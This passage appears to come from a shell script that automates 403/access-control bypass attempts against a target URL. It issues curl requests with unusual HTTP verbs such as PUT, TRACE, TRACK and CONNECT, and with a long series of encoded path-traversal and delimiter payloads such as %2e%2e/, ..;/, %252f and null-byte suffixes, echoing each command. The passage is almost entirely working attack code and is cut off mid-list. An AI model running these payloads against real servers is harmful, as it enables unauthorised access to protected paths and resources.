code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -I -H "$user_agent")
print
echo -n "OPTIONS : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X OPTIONS
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X OPTIONS)
print
echo -n "PUT : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X PUT
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X PUT)
print
echo -n "TRACE : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X TRACE
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X TRACE)
print
echo  -n "PATCH : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X PATCH
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X PATCH)
print
echo  -n "TRACK : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X TRACK
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X TRACK)
print
echo  -n "CONNECT : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X CONNECT
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X CONNECT)
print
echo  -n "UPDATE : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X UPDATE
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X UPDATE)
print
echo  -n "LOCK : "
echo curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X LOCK
code=$(curl --path-as-is -skg "$URL" -w "Status: %{http_code}, Length: %{size_download}\n" -L -o "$(date +%s%N).html" -H "$user_agent" -X LOCK)
print


echo -e ${blue}"-----------------------------"${end}
echo -e ${cyan}"[+] URL Tricks Bypass suffix "${end}
echo -e ${blue}"-----------------------------"${end}

echo -n "Payload [ #? ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL#?" -H "$user_agent")
print
echo -n "Payload [ %09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09" -H "$user_agent")
print
echo -n "Payload [ %09%3b ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09%3b" -H "$user_agent")
print
echo -n "Payload [ %09.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09.." -H "$user_agent")
print
echo -n "Payload [ %09; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%09;" -H "$user_agent")
print
echo -n "Payload [ %20 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%20" -H "$user_agent")
print
echo -n "Payload [ %23%3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%23%3f" -H "$user_agent")
print
echo -n "Payload [ %252f%252f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f%252f" -H "$user_agent")
print
echo -n "Payload [ %252f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%252f/" -H "$user_agent")
print
echo -n "Payload [ %2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e" -H "$user_agent")
print
echo -n "Payload [ %2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ %2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%20%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%20%23" -H "$user_agent")
print
echo -n "Payload [ %2f%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%23" -H "$user_agent")
print
echo -n "Payload [ %2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3b%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3b%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %2f%3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f" -H "$user_agent")
print
echo -n "Payload [ %2f%3f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f%3f/" -H "$user_agent")
print
echo -n "Payload [ %2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%2f/" -H "$user_agent")
print
echo -n "Payload [ %3b ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b" -H "$user_agent")
print
echo -n "Payload [ %3b%09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%09" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e%2e%2f%2e%2e%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e%2e%2f%2e%2e%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %3b%2f%2e. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f%2e." -H "$user_agent")
print
echo -n "Payload [ %3b%2f.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b%2f.." -H "$user_agent")
print
echo -n "Payload [ %3b/%2e%2e/..%2f%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e%2e/..%2f%2f" -H "$user_agent")
print
echo -n "Payload [ %3b/%2e. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2e." -H "$user_agent")
print
echo -n "Payload [ %3b/%2f%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/%2f%2f../" -H "$user_agent")
print
echo -n "Payload [ %3b/.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b/.." -H "$user_agent")
print
echo -n "Payload [ %3b//%2f../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3b//%2f../" -H "$user_agent")
print
echo -n "Payload [ %3f%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%23" -H "$user_agent")
print
echo -n "Payload [ %3f%3f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL%3f%3f" -H "$user_agent")
print
echo -n "Payload [ .. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL.." -H "$user_agent")
print
echo -n "Payload [ ..%00/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00/;" -H "$user_agent")
print
echo -n "Payload [ ..%00;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%00;/" -H "$user_agent")
print
echo -n "Payload [ ..%09 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%09" -H "$user_agent")
print
echo -n "Payload [ ..%0d/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d/;" -H "$user_agent")
print
echo -n "Payload [ ..%0d;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%0d;/" -H "$user_agent")
print
echo -n "Payload [ ..%5c/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%5c/" -H "$user_agent")
print
echo -n "Payload [ ..%ff/; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff/;" -H "$user_agent")
print
echo -n "Payload [ ..%ff;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..%ff;/" -H "$user_agent")
print
echo -n "Payload [ ..;%00/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%00/" -H "$user_agent")
print
echo -n "Payload [ ..;%0d/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%0d/" -H "$user_agent")
print
echo -n "Payload [ ..;%ff/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;%ff/" -H "$user_agent")
print
echo -n "Payload [ ..;\ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\\" -H "$user_agent")
print
echo -n "Payload [ ..;\; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..;\;" -H "$user_agent")
print
echo -n "Payload [ ..\; ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL..\;" -H "$user_agent")
print
echo -n "Payload [ /%20# ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20#" -H "$user_agent")
print
echo -n "Payload [ /%20%23 ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%20%23" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%252f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%252f/" -H "$user_agent")
print
echo -n "Payload [ /%252e%252e%253b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252e%253b/" -H "$user_agent")
print
echo -n "Payload [ /%252e%252f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%252f/" -H "$user_agent")
print
echo -n "Payload [ /%252e%253b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e%253b/" -H "$user_agent")
print
echo -n "Payload [ /%252e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252e/" -H "$user_agent")
print
echo -n "Payload [ /%252f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%252f" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e%3b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e%3b/" -H "$user_agent")
print
echo -n "Payload [ /%2e%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2e/" -H "$user_agent")
print
echo -n "Payload [ /%2e%2f/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%2f/" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b/" -H "$user_agent")
print
echo -n "Payload [ /%2e%3b// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e%3b//" -H "$user_agent")
print
echo -n "Payload [ /%2e/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e/" -H "$user_agent")
print
echo -n "Payload [ /%2e// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2e//" -H "$user_agent")
print
echo -n "Payload [ /%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%2f" -H "$user_agent")
print
echo -n "Payload [ /%3b/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/%3b/" -H "$user_agent")
print
echo -n "Payload [ /.. ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.." -H "$user_agent")
print
echo -n "Payload [ /..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ /..%2f..%2f..%2f ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/..%2f..%2f..%2f" -H "$user_agent")
print
echo -n "Payload [ /../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../" -H "$user_agent")
print
echo -n "Payload [ /../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../" -H "$user_agent")
print
echo -n "Payload [ /../../../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../../" -H "$user_agent")
print
echo -n "Payload [ /../../..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../../..//" -H "$user_agent")
print
echo -n "Payload [ /../..// ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//" -H "$user_agent")
print
echo -n "Payload [ /../..//../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..//../" -H "$user_agent")
print
echo -n "Payload [ /../..;/ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/../..;/" -H "$user_agent")
print
echo -n "Payload [ /.././../ ]:"
echo curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent"
code=$(curl --path-as-is -skg -o "$(date +%s%N).html" -w "Status: %{http_code}, Length: %{size_download}\n" "$URL/.././../" -H "$user_agent")
print
echo -n "Payload [ /../.;/../ ]:"
